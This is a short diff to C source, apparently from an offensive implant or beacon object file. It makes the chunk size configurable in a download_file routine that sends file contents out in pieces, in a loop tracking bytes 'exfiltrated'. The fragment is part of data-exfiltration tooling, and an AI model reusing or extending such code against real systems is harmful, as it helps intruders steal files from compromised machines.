@@ -637,6 +637,7 @@ VOID generate_invalid_sig(
 #if defined(NANO) && defined(BOF)
 
 BOOL download_file(
+    IN DWORD chunk_size,
     IN LPCSTR fileName,
     IN char fileData[],
     IN ULONG32 fileLength)
@@ -689,7 +690,7 @@ BOOL download_file(
     DATA_FREE(packedData, messageLength);
 
     // we use the same memory region for all chucks
-    int chunkLength = 4 + CHUNK_SIZE;
+    int chunkLength = 4 + chunk_size;
     char* packedChunk = intAlloc(chunkLength);
     if (!packedChunk)
     {
@@ -707,7 +708,7 @@ BOOL download_file(
     while (exfiltrated < fileLength)
     {
         // send the file content by chunks
-        chunkLength = fileLength - exfiltrated > CHUNK_SIZE ? CHUNK_SIZE : fileLength - exfiltrated;
+        chunkLength = fileLength - exfiltrated > chunk_size ? chunk_size : fileLength - exfiltrated;
         ULONG32 chunkIndex = 4;
         for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
         {
